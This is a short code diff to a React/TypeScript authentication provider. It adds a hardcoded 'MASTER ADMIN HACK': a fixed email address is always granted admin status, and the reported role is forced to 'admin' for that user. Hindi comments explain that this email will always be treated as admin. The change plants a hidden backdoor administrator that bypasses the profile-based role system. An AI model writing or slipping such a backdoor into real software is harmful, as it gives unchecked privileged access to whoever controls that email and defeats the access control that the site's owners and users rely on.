@@ -25,9 +25,13 @@ export function AuthProvider({ children }: { children: ReactNode }) {
   const [session, setSession] = useState<Session | null>(null)
   const [loading, setLoading] = useState(true)
 
-  // Asli Role based system
+  // 🚀 MASTER ADMIN HACK
+  const MASTER_EMAIL = "k51we90@rulersonline.com"
+
   const role = profile?.role ?? 'guest'
-  const isAdmin = role === 'admin'
+  
+  // Ab aapka email hamesha Admin mana jayega
+  const isAdmin = role === 'admin' || user?.email === MASTER_EMAIL
   const isModerator = role === 'moderator' || isAdmin
   const isSubscriber = role === 'subscriber' || isModerator
 
@@ -107,7 +111,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
       profile,
       session,
       loading,
-      role,
+      role: isAdmin ? 'admin' : role,
       isAdmin,
       isModerator,
       isSubscriber,
